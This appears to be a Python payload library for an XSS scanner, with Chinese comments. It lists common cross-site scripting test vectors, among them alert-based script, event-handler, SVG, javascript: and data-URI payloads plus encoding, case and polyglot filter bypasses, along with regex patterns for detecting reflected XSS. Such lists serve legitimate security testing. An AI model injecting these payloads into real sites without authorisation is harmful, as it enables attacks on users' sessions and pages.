"""
XSS (跨站脚本) Payload库

包含常见的XSS测试向量和检测模式
"""

# XSS Payload
XSS_PAYLOADS = [
    # 基础XSS
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    
    # IMG标签XSS
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<img src=javascript:alert('XSS')>",
    
    # 事件处理XSS
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    
    # SVG XSS
    "<svg onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    
    # JavaScript协议
    "javascript:alert('XSS')",
    "javascript:alert(1)",
    
    # Data URI
    "data:text/html,<script>alert('XSS')</script>",
    
    # DOM XSS
    "<iframe src=javascript:alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    
    # 引号绕过
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    "';alert('XSS');//",
    
    # HTML5 XSS
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    
    # 编码绕过
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    
    # 大小写绕过
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<IMG SRC=x ONERROR=alert('XSS')>",
    
    # 空格绕过
    "<img/src=x/onerror=alert('XSS')>",
    
    # Polyglot XSS
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
]

# XSS检测模式
XSS_DETECTION_PATTERNS = [
    # 脚本标签反射
    r"<script[^>]*>.*?</script>",
    r"<script[^>]*>",
    
    # 事件处理器反射
    r"on\w+\s*=",
    r"onerror\s*=",
    r"onload\s*=",
    r"onfocus\s*=",
    
    # JavaScript协议
    r"javascript:",
    
    # SVG标签
    r"<svg[^>]*>",
    
    # 危险标签
    r"<iframe[^>]*>",
    r"<embed[^>]*>",
    r"<object[^>]*>",
    
    # Alert函数
    r"alert\(",
    
    # Data URI
    r"data:text/html",
]
